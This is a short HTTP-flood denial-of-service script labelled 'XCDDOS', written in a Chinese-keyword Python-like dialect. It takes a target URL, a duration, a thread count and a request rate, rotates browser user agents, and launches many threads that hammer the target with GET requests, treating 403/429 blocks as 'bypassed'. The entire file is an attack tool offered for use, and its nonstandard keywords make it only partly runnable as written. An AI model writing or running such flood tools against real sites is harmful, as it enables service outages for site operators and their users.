# Made By XCDDOS || Xc Corporation
# This Syntax PyChinese

导入 请求库 (requests)
导入 线程库 (threading)
导入 时间库 (time)
导入 随机库 (random)
导入 sys

用户代理列表 = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

如果 len(sys.argv) != 5:
    打印("用法: python3 xcddos.py <url> <time> <thread> <rps>")
    sys.exit(1)

地址 = sys.argv[1]
持续时间 = int(sys.argv[2])
线程数 = int(sys.argv[3])
每秒请求数 = int(sys.argv[4])

定义 创建会话():
    会话 = 请求库.Session()
    会话.headers.update({
        "User-Agent": 随机库.choice(用户代理列表),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    })
    会话.verify = True
    return 会话

定义 发送请求(会话):
    计数 = 0
    开始时间 = 时间库.时间()
    而 时间库.时间() - 开始时间 < 持续时间:
        如果 计数 >= 每秒请求数:
            计数 = 0
            时间库.睡眠(1)
        否则:
            尝试:
                响应 = 会话.get(地址, timeout=5)
                如果 响应.status_code 在 [404, 429, 403, 405]:
                    打印(f"状态码 {响应.status_code} 被绕过，继续尝试...")
                否则:
                    打印(f"请求成功，状态码: {响应.status_code}")
            除 异常 为 错误:
                打印(f"请求失败: {错误}")
            计数 += 1

线程们 = []
为 i 在 范围(线程数):
    会话 = 创建会话()
    线程 = 线程库.Thread(目标=发送请求, 参数=(会话,))
    线程们.追加(线程)
    线程.启动()

为 线程 在 线程们:
    线程.加入()

打印("所有请求已完成。")
